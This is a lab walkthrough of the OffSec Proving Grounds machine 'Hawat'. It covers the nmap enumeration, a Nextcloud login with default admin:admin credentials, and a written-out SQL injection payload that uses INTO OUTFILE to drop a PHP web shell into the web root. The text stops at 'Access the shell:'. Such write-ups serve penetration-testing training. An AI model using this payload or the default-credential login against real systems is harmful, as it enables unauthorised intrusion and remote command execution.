Hello,

We are going to exploit one of [OffSec Proving Grounds](https://portal.offensive-security.com/proving-grounds/play) Medium machines which called `Hawat` and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.

## Enumeration:
- Nmap:

```bash
 â—‹ nmap -p- -T4 -vvv -Pn -oN nmap-all --max-retries 1 192.168.249.147                       
# Nmap 7.92 scan initiated Mon Jan  3 15:35:07 2022 as: nmap -p- -T4 -vvv -Pn -oN nmap-all --max-retries 1 192.168.249.147
Increasing send delay for 192.168.249.147 from 0 to 5 due to 11 out of 19 dropped probes since last increase.
Warning: 192.168.249.147 giving up on port because retransmission cap hit (1).
Nmap scan report for hawat.pg (192.168.249.147)
Host is up, received user-set (0.15s latency).

# Nmap done at Mon Jan  3 15:49:34 2022 -- 1 IP address (1 host up) scanned in 867.42 seconds
                                                                                               
```

- Port `22` SSH.
- Port `17445` is an issue tracker web application:

- Port `30455` is Running a web Server, Using gobuster against that port gives us `phpinfo.php` file:
![image](../../assets/img/sample/pg-hawat/phpinfo.png)

- Port `50080` is Running Web Server, gobuster finds `/cloud` directory which is a nextcloud web application:
![image](../../assets/img/sample/pg-hawat/nextcloud.png)

- Login with `admin:admin` to `nextcloud` at http://hawat.pg:50080/cloud/.
- Download `issuetracker.zip` file:
![image](../../assets/img/sample/pg-hawat/downloadzip.png)

- After some `source code analysis`, we discover an SQL Injection vulnerability, which effects the issuetracker application on port `17445` at this endpoint `http://192.168.96.147:17445/issue/checkByPriority` via `priority` parameter:
![image](../../assets/img/sample/pg-hawat/sqli.png)

- Exploit SQL Injection and Write a shell on the server:
1. we have a phpinfo.php file on http://hawat.pg:30455/phpinfo.php and it shows the root directory of the web server:

![image](../../assets/img/sample/pg-hawat/rootdir.png)

2. Write a PHP web shell on the server using SQL Injection, You have to Create an account first, then login to the issuetracker application to exploit it, urlencode the bellow payload and inject it in `priority` parameter at `http://192.168.96.147:17445/issue/checkByPriority?priority=EXPLOIT` :
    * Exploit: `' union select '<?php echo system($_REQUEST["bingo"]); ?>' into outfile '/srv/http/cmd.php' -- -`

- Access the shell:
